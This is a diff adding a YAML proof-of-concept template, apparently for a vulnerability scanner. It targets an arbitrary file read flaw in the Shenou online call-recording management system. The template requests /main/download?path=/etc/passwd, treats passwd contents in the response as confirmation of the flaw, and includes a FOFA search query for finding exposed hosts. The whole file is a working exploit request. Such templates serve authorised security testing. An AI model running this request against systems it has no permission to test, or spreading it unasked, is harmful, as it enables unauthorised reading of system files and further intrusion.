@@ -1,0 +1,15 @@
+id: poc-yaml-shenou-communication-download-anyfile-read
+info:
+  name: 申瓯通信 在线录音管理系统 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 在线录音管理系统
+  fofa: title="在线录音管理系统"
+requests:
+- method: GET
+  path: /main/download?path=/etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"filename=\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
